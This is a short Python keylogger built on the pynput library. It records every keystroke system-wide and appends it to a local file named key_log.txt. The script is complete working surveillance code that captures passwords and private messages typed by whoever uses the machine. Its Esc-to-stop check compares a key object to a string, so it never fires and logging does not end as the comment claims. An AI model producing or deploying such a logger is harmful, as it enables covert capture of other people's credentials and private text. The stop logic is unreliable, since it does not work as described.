from pynput.keyboard import Listener

# File to store logged keys
log_file = "key_log.txt"

def on_press(key):
    """Callback function when a key is pressed"""
    try:
        # Log the character if printable
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Handle special keys (e.g., 'Key.space')
        with open(log_file, "a") as f:
            f.write(f" {key} ")

def on_release(key):
    """Callback function when a key is released"""
    if key == "Key.esc":  # Stop logging when 'Esc' key is pressed
        return False

# Start listening to keyboard events
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
